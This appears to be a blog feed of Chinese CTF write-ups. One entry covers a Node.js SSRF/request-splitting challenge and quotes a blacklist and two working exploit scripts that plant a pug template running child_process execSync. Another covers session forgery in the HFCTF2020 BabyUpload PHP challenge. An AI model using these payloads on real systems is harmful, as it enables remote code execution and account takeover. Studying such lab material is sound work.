                        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token string">"ECONNRESET"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Timeout occurs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token keyword">return</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                    resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">try</span> <span class="token punctuation">{</span>
                            resps <span class="token operator">=</span> chunk<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>resps<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
                        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"search param 'q' missing!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token keyword">function</span> <span class="token function">blacklist</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> evilwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"global"</span><span class="token punctuation">,</span> <span class="token string">"process"</span><span class="token punctuation">,</span> <span class="token string">"mainModule"</span><span class="token punctuation">,</span> <span class="token string">"require"</span><span class="token punctuation">,</span> <span class="token string">"root"</span><span class="token punctuation">,</span> <span class="token string">"child_process"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> arrayLen <span class="token operator">=</span> evilwords<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayLen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> trigger <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>evilwords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>就简单贴几个路由和过滤函数<br>根目录是解析一个template目录下的pug文件并返回，查了一下pug就是一个渲染模板一类的东西，可以在里面写一些代码进行渲染，命令执行估计是靠这个<br>file_upload路由需要remote_address是localhost，必然需要找一个ssrf点，上传一个文件到对应的mimetype文件夹下，mimetype即为文件上传部分的content-type（注意不是请求头中的content-type）<br>source路由展示源码，写死了无法控制<br>core路由是一个ssrf点，但是路由写死了source，后面的参数q可控，但需要通过blacklist的检测</p>
<p>说实话到这一步感觉整个思路很清晰，利用ssrf打file_upload<br>传一个pug文件到template文件夹，然后在根路由下包含一下执行命令即可，但是最大的问题就在于，这个写死了的路径怎么打一个ssrf</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>开始看wp，nodejs在版本号小于8.x的时候存在unicode字符损坏导致的漏洞，而这个题目的版本刚好对的上（但是buu上的这个题并没有说版本），简单来说就是Unicode在解析的时候由于解码的类型问题导致部分被截断，字符出现变形，而原字符并非会被转义的危险字符造成的安全漏洞，具体就是先知社区这篇文章<br><a href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p>
<p>所以构造一下payload，通过换行符使得服务器在core中发出的一次http请求变成两次，并且第二次请求内容我们完全可控<br>可以先去upload目录上传文件抓一个包作为文件上传的模板，构造一下，赵总和出题人有两套不同的脚本构造字符，但是没有一个人说明这些字符是怎么构造出来的，并且两个脚本不互通，分别能用，但是尝试用赵总的脚本放一个命令执行的payload时直接把buu的环境打到了404。。。被迫重新开环境</p>
<p>关于waf的绕过，想过直接二次编码绕过，因为这种ssrf发到服务器一次解码，服务器再发送到服务器二次解码，而检测只发生在第一次解码时，二次编码理论上超级绕过，但是这里编码需要把整个payload编码一遍，导致的结果就是第二个http包的部分内容也来了个二次编码，比如filename那里，在第二次发包的时候属于header内容，二次编码但解码只有一次（解码只对post和get提交的数据进行），会导致文件名有问题，但是那里如果只编码一次就会造成blacklist里面的引号限制过不去，所以说到底还是需要用截断字符这种编码方式去构造一个完全无关的字符而截断后却完全可利用的方式去攻击</p>
<h3 id="赵总脚本"><a href="#赵总脚本" class="headerlink" title="赵总脚本"></a>赵总脚本</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://66adb99f-4995-46d2-9c4a-c3e49d95ed61.node3.buuoj.cn/"</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">''' HTTP/1.1
Host: x
Connection: keep-alive

POST /file_upload HTTP/1.1
Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810
Connection: keep-alive
cache-control: no-cache
Host: x
Content-Length: 292

----------------------------919695033422425209299810
Content-Disposition: form-data; name="file"; filename="z33.pug"
Content-Type: /../template

doctype html
html
  head
    style
      include ../../../../../../../flag.txt

----------------------------919695033422425209299810--

GET /flag HTTP/1.1
Host: x
Connection: close
x:'''</span>

payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span><span class="token string">'0xff'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"core?q="</span> <span class="token operator">+</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>这个是在全部在前面加0xff，说实话我没想通为什么上传文件的内容改成命令执行之后打上去打到了环境404，这个方法的payload完全和blacklist无关，不过加了0xff之后的内容本来就没几个正常字符了，肯定能够检测<br>赵总在这个payload中提到keep-alive在第一个请求中一定要设置，但是事实上去掉了好像也没什么事</p>
<h3 id="出题人脚本"><a href="#出题人脚本" class="headerlink" title="出题人脚本"></a>出题人脚本</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

payloadRaw <span class="token operator">=</span> <span class="token triple-quoted-string string">"""x HTTP/1.1

POST /file_upload HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
Content-Length: 6279
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/?action=upload
Upgrade-Insecure-Requests: 1

-----------------------------12837266501973088788260782942
Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"
Content-Type: ../template

- global.process.mainModule.require('child_process').execSync('evalcmd')
-----------------------------12837266501973088788260782942--


"""</span>

<span class="token keyword">def</span> <span class="token function">getParm</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"%C4%A0"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">"%C4%8D%C4%8A"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"%C4%A2"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"%C4%A7"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"%C5%A0"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"!"</span><span class="token punctuation">,</span><span class="token string">"%C4%A1"</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"%2B"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"%3B"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"%26"</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Bypass Waf </span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"global"</span><span class="token punctuation">,</span><span class="token string">"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"process"</span><span class="token punctuation">,</span><span class="token string">"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"mainModule"</span><span class="token punctuation">,</span><span class="token string">"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"require"</span><span class="token punctuation">,</span><span class="token string">"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"%C5%B2%C5%AF%C5%AF%C5%B4"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">,</span><span class="token string">"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"%C5%A5%C5%B8%C5%A5%C5%A3"</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> payload

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payloadC <span class="token operator">=</span>  payloadRaw<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"evalcmd"</span><span class="token punctuation">,</span>cmd<span class="token punctuation">)</span>
    urlC <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/core?q="</span><span class="token operator">+</span>getParm<span class="token punctuation">(</span>payloadC<span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urlC<span class="token punctuation">)</span>
    
    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/?action=5am3_get_flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    targetUrl <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    cmd <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span> run<span class="token punctuation">(</span>targetUrl<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span>
</code></pre>
<p>出题人这个更加看不懂，绕过waf的那段的编码完全看不出来是怎么得出的，但是可以执行命令，靠谱一点</p>
<h3 id="pug的解析方法"><a href="#pug的解析方法" class="headerlink" title="pug的解析方法"></a>pug的解析方法</h3><p>看了wp用的是-后接代码，去看了眼文档，其实还有很多其他解析方式，贴个文档链接<br><a href="https://pugjs.org/zh-cn/language/code.html">https://pugjs.org/zh-cn/language/code.html</a><br>赵总使用了文档中的include方法直接包含了flag文件，不过不能执行命令的话你又怎么知道flag在哪呢</p>
<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>放一下赵总和出题人的wp<br><a href="https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game">https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game</a><br><a href="https://www.zhaoj.in/read-6462.html">https://www.zhaoj.in/read-6462.html</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>HTTP走私攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>[HFCTF2020] BabyUpload</title>
    <url>/%5BHFCTF2020%5DBabyUpload.html</url>
    <content><![CDATA[<h1 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h1><p>学习了PHP的session机制，感觉还学到了点东西，懂了session是怎么存的这个题就很简单了</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>好长一串</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string">"/var/babyctf/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span> <span class="token string">"/flag"</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'/var/babyctf/success.txt'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">safe_delete</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$direction</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'direction'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'attr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dir_path</span> <span class="token operator">=</span> <span class="token string">"/var/babyctf/"</span><span class="token punctuation">.</span><span class="token variable">$attr</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$attr</span><span class="token operator">===</span><span class="token string">"private"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$dir_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string">"upload"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$file_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"_"</span><span class="token punctuation">.</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string">"sha256"</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir_path</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">,</span> <span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token string">"uploaded"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string">"download"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'file not exist'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: application/force-download'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Length: '</span><span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition: attachment; filename="'</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token string">"downloaded"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>提供了一个上传功能和一个下载功能，上传下载都不允许跳目录，上传功能的文件名不可控，可以看到把session文件存储路径改到了我们上传下载的路径上，而取得flag的条件是我们的身份是admin且存在一个success.txt<br>由于文件名不可控，我们就无法上传一个名为success.txt的文件，但是file_exists函数的作用的是<strong>检查文件或目录是否存在</strong>，所以我们用attr创建一个名为success.txt的目录就可以过这个判断</p>
<h3 id="php-session"><a href="#php-session" class="headerlink" title="php session"></a>php session</h3><p>session文件名以 sess_ 为前缀，后跟 SESSION ID（即cookie中PHPSESSID的值），存放的数据为序列化的session信息。<br>我们发起访问的时候就通过这个cookie的值去查询对应的session文件，这里就还可以牵扯出PHP的session反序列化导致的各种漏洞，不在这里赘述了<br>所以我们可以先用download功能下载一下自己的session文件看一看，下载出来的内容为<code>\x08usernames:5:&quot;guest&quot;;</code>，\x08为不可见字符，要注意<br>我们把guest改成admin，文件名就叫做sess，上传上去，这样子服务端就获得了一个名为sess_(file_hash(sess))的文件，我们自己计算一下文件的哈希值，得到文件叫<code>sess_f567e441819b3b6408c99607cd47e41b4c3167e9a46f82cb5c14b843ad5a25d0</code>，然后将cookie替换为该哈希值进行访问，这样子服务端就将身份替换为了admin，并且也已经创建好了success.txt这个目录，可以通过检测，获取flag了</p>
]]></content>
      <categories>
